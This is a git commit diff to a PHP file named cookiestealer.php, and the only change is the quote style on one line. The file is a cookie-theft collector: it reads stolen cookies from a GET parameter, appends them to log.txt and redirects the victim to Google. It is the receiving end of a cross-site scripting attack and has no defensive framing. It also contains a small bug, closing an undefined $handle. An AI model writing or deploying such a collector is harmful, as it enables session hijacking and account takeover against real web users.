28d2152a3e0b4efe215640ed76b4d9e09f30f5d7
Dilan Galindo Reyna <31717609+DilanGalindo@users.noreply.github.com>
2019-11-20 18:26:19 -0600

    Update cookiestealer.php

--- cookiestealer.php
+++ cookiestealer.php
@@ -1,6 +1,6 @@
 <?php
         $cookies = $_GET["c"];
-        $file = fopen('log.txt', 'a');
+        $file = fopen("log.txt", "a");
         fwrite($file, $cookies . "\n\n");
         fclose($handle);
         header("Location: http://www.google.com/"); 
